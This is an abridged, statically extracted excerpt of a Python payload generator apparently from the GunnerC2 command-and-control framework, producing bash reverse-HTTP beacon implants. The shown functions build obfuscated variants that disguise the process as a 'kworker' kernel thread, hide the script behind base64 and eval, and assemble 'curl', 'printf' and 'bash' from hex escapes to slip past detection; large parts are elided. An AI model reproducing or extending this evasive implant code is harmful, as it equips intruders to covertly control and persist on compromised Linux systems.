# Extracted from: C:\DEV\PyAgent\src\external_candidates\ingested\_0xsojalsec_gunnerc2.py\core.py\payload_generator.py\linux.py\http.py\bash_reverse_http_8f429a2bb0e8.py
# NOTE: extracted with static-only rules; review before use

# Extracted from: C:\DEV\PyAgent\.external\0xSojalSec-GunnerC2\core\payload_generator\linux\http\bash_reverse_http.py
...
def make_raw(beacon_url, interval):
    ...
    parts.append(
        r"""gen_sid(){ local chars=abcdefghijklmnopqrstuvwxyz0123456789 part idx; for idx in 1 2 3; do part=""; for j in {1..5}; do part+=${chars:RANDOM%${#chars}:1}; done; sid[$((idx-1))]=$part; done; printf "%s-%s-%s" "${sid[0]}" "${sid[1]}" "${sid[2]}"; }"""
    )
...
def generate_bash_reverse_http_obs1(beacon_url, interval):
    ...
    parts.append(
        f"""gen_sid(){{ local chars=abcdefghijklmnopqrstuvwxyz0123456789 part idx; for idx in 1 2 3; do part=""; for j in {{1..5}}; do part+=${{chars:RANDOM%${{#chars}}:1}}; done; sid[$((idx-1))]=$part; done; printf "%s-%s-%s" "${{sid[0]}}" "${{sid[1]}}" "${{sid[2]}}"; }}"""
    )
    ...
    return f"( exec -a kworker/0:1-events bash <<'EOF'\n{script}\nEOF\n) &"
...
def generate_bash_reverse_http_obs2(beacon_url: str, interval: int) -> str:
    ...
    parts.append(
        f"""gen_sid(){{ local chars=abcdefghijklmnopqrstuvwxyz0123456789 part idx; for idx in 1 2 3; do part=""; for j in {{1..5}}; do part+=${{chars:RANDOM%${{#chars}}:1}}; done; sid[$((idx-1))]=$part; done; $PR "%s-%s-%s" "${{sid[0]}}" "${{sid[1]}}" "${{sid[2]}}"; }}"""
    )
...
exit 0""")
    ...
    payload = f"( exec -a kworker/0:1-events bash <<'EOF'\neval \"$(printf '%s' '{blob}' | base64 -d)\"\nEOF\n) &"
...
def generate_bash_reverse_http_obs3(beacon_url, interval):
    ...
    parts.append(
        r"C=$(printf '\x63'); U=$(printf '\x75'); R=$(printf '\x72'); L=$(printf '\x6c'); CC="
        "$C$U$R$L"
        ""
    )
    ...
    parts.append(
        r"P=$(printf '\x70'); R2=$(printf '\x72'); I=$(printf '\x69'); N=$(printf '\x6e'); T=$(printf '\x74'); F=$(printf '\x66'); PR="
        "$P$R2$I$N$T$F"
        ""
    )

    parts.append(
        r"B=$(printf '\x62'); A=$(printf '\x61'); S2=$(printf '\x73'); H=$(printf '\x68'); BS="
        "$B$A$S2$H"
        ""
    )
    ...
    parts.append(
        f"""gen_sid(){{ local c=abcdefghijklmnopqrstuvwxyz0123456789 part i; \
